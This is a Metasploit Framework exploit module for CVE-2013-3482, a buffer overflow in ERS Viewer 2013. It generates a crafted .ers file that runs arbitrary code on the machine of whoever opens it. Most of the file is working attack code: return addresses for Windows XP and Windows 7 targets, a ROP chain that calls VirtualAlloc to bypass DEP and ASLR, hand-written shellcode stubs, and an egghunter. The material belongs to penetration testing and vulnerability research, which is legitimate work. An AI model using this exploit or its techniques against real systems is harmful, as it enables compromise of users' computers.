
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Egghunter

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ERS Viewer 2013 ERS File Handling Buffer Overflow",
      'Description'    => %q{
          This module exploits a buffer overflow vulnerability found in ERS Viewer 2013.
        The vulnerability exists in the module ermapper_u.dll, where the function
        rf_report_error handles user provided data in a insecure way. It results in
        arbitrary code execution under the context of the user viewing a specially crafted
        .ers file. This module has been tested successfully with ERS Viewer 2013 (versions
        13.0.0.1151) on Windows XP SP3 and Windows 7 SP1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'James Fitts', # Vulnerability Discovery
          'juan vazquez' # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2013-3482' ],
          [ 'OSVDB', '93650' ],
          [ 'URL', 'http://secunia.com/advisories/53620/' ]
        ],
      'Payload'        =>
        {
          'Space'    => 4000,
          'DisableNops' => true,
        },
      'DefaultOptions'  =>
        {
          'ExitFunction' => "process",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested on Windows XP SP3
          [ 'ERS Viewer 2013 13.0.0.1151 / NO DEP / NO ASLR',
            {
              'Offset' => 191,
              'Ret' => 0x100329E9 # jmp eax # from ermapper_u.dll
            }
          ],
          # Tested on Windows XP SP3 and Windows 7 SP1
          [ 'ERS Viewer 2013 13.0.0.1151 / DEP & ASLR bypass',
            {
              'Offset' => 191,
              'Ret' => 0x100E1152,     # xchg eax, esp # ret # from ermapper_u.dll
              'RetNull' => 0x30d07f00, # ret ending with null byte # from ethrlib.dll
              'VirtualAllocPtr' => 0x1010c0f4
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "May 23 2013",
      'DefaultTarget'  => 1))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.',  'msf.ers']),
      ], self.class)

  end

  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
      [
        0x10082624,    # POP EAX # RETN [ermapper_u.dll]
        0x1010c0f4,    # ptr to &VirtualAlloc() [IAT ermapper_u.dll]
        0x1001a9c0,    # MOV EAX,DWORD PTR DS:[EAX] # RETN [ermapper_u.dll]
        0x1005db36,    # XCHG EAX,ESI # RETN [ermapper_u.dll]
        0x10105d87,    # POP EBX # RETN [ermapper_u.dll]
        0xffffffff,    #
        0x30d059d9,    # INC EBX # RETN [ethrlib.dll]
        0x30d059d9,    # INC EBX # RETN [ethrlib.dll]
        0x100e9dd9,    # POP EAX # RETN [ermapper_u.dll]
        0xa2dbcf75,    # put delta into eax (-> put 0x00001000 into edx)
        0x1001aa04,    # ADD EAX,5D24408B # RETN [ermapper_u.dll]
        0x10016a98,    # XCHG EAX,EDX # OR EAX,4C48300 # POP EDI # POP EBP # RETN [ermapper_u.dll]
        0x10086d21,    # RETN (ROP NOP) [ermapper_u.dll]
        0x1001a148,    # & push esp # ret  [ermapper_u.dll]
        0x10082624,    # POP EAX # RETN [ermapper_u.dll]
        0xffffffc0,    # Value to negate, will become 0x00000040
        0x100f687d,    # NEG EAX # RETN [ermapper_u.dll]
        0x1001e720,    # XCHG EAX,ECX # ADC EAX,5DE58B10 # RETN [ermapper_u.dll]
        0x100288b5,    # POP EAX # RETN [ermapper_u.dll]
        0x90909090,    # nop
        0x100e69e0,    # PUSHAD # RETN [ermapper_u.dll]
      ].flatten.pack("V*")

    return rop_gadgets
  end

  # Restore the stack pointer in order to execute the final payload successfully
  def fix_stack
    pivot = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18] # get teb
    pivot << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    pivot << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    pivot << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
    return pivot
  end

  # In the Windows 7 case, in order to bypass ASLR/DEP successfully, after finding
  # the payload on memory we can't jump there directly, but allocate executable memory
  # and jump there. Badchars: "\x0a\x0d\x00"
  def hunter_suffix(payload_length)
    # push flProtect (0x40)
    suffix = "\xB8\xC0\xFF\xFF\xFF"                              # mov eax, 0xffffffc0
    suffix << "\xF7\xD8"                                         # neg eax
    suffix << "\x50"                                             # push eax
    # push flAllocationType (0x3000)
    suffix << "\x66\x05\xC0\x2F"                                 # add ax, 0x2fc0
    suffix << "\x50"                                             # push eax
    # push dwSize (0x1000)
    suffix << "\x66\x2D\xFF\x1F"                                 # sub ax, 0x1fff
    suffix << "\x48"                                             # dec eax
    suffix << "\x50"                                             # push eax
    # push lpAddress
    suffix << "\xB8\x0C\x0C\x0C\x0C"                             # mov eax, 0x0c0c0c0c
    suffix << "\x50" # push eax
    # Call VirtualAlloc
    suffix << "\xFF\x15" + [target['VirtualAllocPtr']].pack("V") # call ds:VirtualAlloc
    # Copy payload (edi) to Allocated memory (eax)
    suffix << "\x89\xFE"                                         # mov esi, edi
    suffix << "\x89\xC7"                                         # mov edi, eax
    suffix << "\x31\xC9"                                         # xor ecx, ecx
    suffix << "\x66\x81\xC1" + [payload_length].pack("v")        # add cx, payload_length
    suffix << "\xF3\xA4"                                         # rep movsb
    # Jmp to the final payload (eax)
    suffix << "\xFF\xE0"                                         # jmp eax

    return suffix
  end

  def exploit

    #These badchars do not apply to the final payload
    badchars = [0x0c, 0x0d, 0x0a].pack("C*")

    eggoptions =
      {
        :checksum => true,
        :eggtag => 'w00t'
      }
    my_payload = fix_stack + payload.encoded

    if target.name =~ /DEP & ASLR bypass/
      # The payload length can't include NULL's in order to
      # build the stub which will copy the final payload to
      # executable memory
      while [my_payload.length].pack("v").include?("\x00")
        my_payload << rand_text(1)
      end
    end

    hunter,egg = generate_egghunter(my_payload, badchars, eggoptions)

    if target.name =~ /DEP & ASLR bypass/
      hunter.gsub!(/\xff\xe7/, hunter_suffix(my_payload.length))
    end

    if target.name =~ /NO DEP/
      buf = rand_text_alpha(1)
      buf << (0x01..0x04).to_a.pack("C*") # Necessary to align EAX as expected
      buf << "AA" # EAX pointing to buf[5] prefixed with 0x00 after ret
      buf << hunter
      buf << rand_text_alpha(target['Offset'] - buf.length)
      buf << [target.ret].pack("V") # jmp eax
      buf << rand_text_alpha(8)
      buf << egg
    elsif target.name =~ /DEP & ASLR bypass/
      buf = rand_text_alpha(1)
      buf << (0x01..0x04).to_a.pack("C*") # Necessary to align EAX as expected
      buf << [target['RetNull']].pack("V")[1,3] # EAX pointing to buf[5] prefixed with 0x00 after ret
      buf << create_rop_chain
      buf << hunter
      buf << rand_text_alpha(target['Offset'] - buf.length)
      buf << [target.ret].pack("V") # xchg eax, esp # ret
      buf << rand_text_alpha(8)
      buf << egg
    end

    ers = %Q|
DatasetHeader Begin
#{buf} End
    |

    file_create(ers)
  end
end


